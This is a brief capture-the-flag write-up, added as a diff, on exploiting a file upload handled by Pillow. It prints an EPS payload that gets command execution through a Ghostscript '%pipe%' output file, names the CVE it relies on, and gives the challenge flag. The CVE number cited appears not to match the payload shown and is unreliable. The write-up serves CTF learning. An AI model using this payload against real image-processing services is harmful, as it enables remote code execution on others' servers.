@@ -1,0 +1,23 @@
+Looking at the source code there is not much going on.
+The only thing is the file upload.
+
+Investigating the file upload and it seems to work fine.
+Reading up on pillow finding a command injection exploit.
+CVE-2022-22817
+
+After googling around, found description of exploit here:
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%<command>) currentdevice putdeviceprops
+
+where we can the output file and get code execution.
+Wrote exploit.py to make this into a program
+
+HTB{c0mfy_bzzzzz_rcb33s_v1b3s}
